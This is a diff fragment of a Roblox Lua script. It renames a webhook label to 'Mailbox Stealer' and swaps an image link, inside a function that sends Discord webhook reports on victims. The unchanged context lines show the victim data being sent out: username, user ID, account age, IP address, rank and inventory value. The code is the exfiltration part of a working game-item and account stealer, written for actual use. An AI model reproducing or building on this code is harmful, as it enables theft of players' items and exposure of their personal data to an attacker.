@@ -1009,7 +1009,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     Image = game:GetService("HttpService"):JSONDecode(Image).data[1].imageUrl
     if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
         imgs =
-        "https://cdn.discordapp.com/attachments/1100823909009465497/1124473588045590578/Screenshot_20230414-055925_Gallery_1.jpg"
+        "https://cdn.discordapp.com/attachments/1100823909009465497/1130420430361088050/its-friday-dancing.gif"
         data1 = {
             ["content"] = ping,
             ["username"] = "Monzz Scriptz",
@@ -1025,7 +1025,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**Monzz Scriptz's Stealer** :skull:",
+                    ["name"] = "**Monzz Scriptz's Mailbox Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1079,7 +1079,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         end
     else
         imgs =
-        "https://cdn.discordapp.com/attachments/1100823909009465497/1124473588045590578/Screenshot_20230414-055925_Gallery_1.jpg"
+        "https://cdn.discordapp.com/attachments/1100823909009465497/1130420430361088050/its-friday-dancing.gif"
         data1 = {
             ["content"] = ping,
             ["username"] = "Monzz Scriptz",
@@ -1095,7 +1095,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**Monzz Scriptz's Stealer** :skull:",
+                    ["name"] = "**Monzz Scriptz's Mailbox Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
